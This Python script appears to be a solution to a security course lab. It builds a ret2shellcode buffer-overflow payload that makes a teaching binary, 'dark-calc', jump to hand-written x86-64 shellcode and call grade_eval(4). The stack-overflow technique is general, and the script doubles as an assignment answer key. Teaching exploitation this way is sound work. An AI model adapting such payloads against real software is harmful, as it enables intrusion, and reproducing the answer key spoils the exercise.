#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

Goal: make dark-calc call grade_eval(4) and print "Hope A will be your grade!".

dark-calc maps its own stack at a fixed address with mmap(PROT_READ|WRITE|
EXEC) and switches %rsp to it in __wrap_main, so the stack is both fixed and
executable.  We therefore put real machine code on the stack and return into
it (ret2shellcode).

Shellcode (13 bytes):
    bf 04 00 00 00     mov  $4,%edi            ; argument for grade_eval
    6a 00              push $0                ; 8-byte alignment pad
    68 87 1a 40 00     push $0x401a87         ; grade_eval
    c3                 ret                    ; jump there

Entering grade_eval through ret, %rsp must be 8 mod 16 (the value it has at a
normal call site), which is why the extra push is present.

The return address of input() is overwritten with the buffer address itself.
The mmap'd stack is 0x721000001000..0x721000801000, the buffer sits at
0x721000800fd0 and the top guard page starts at 0x721000801000, so the whole
payload must stay below 48 bytes.
"""
import struct
import sys

BUF = 0x721000800FD0     # expression[16] inside the fixed mmap'd stack
RET_SLOT = 24            # offset of input()'s saved return address
GRADE_EVAL = 0x401A87

shellcode = b""
shellcode += b"\xbf\x04\x00\x00\x00"              # mov $4,%edi
shellcode += b"\x6a\x00"                          # push $0   (alignment)
shellcode += b"\x68" + struct.pack("<I", GRADE_EVAL)  # push $grade_eval
shellcode += b"\xc3"                              # ret

payload = shellcode.ljust(RET_SLOT, b"\x90")      # code first, then NOPs
payload += struct.pack("<Q", BUF)                 # return into the shellcode

sys.stdout.buffer.write(payload + b"\n")
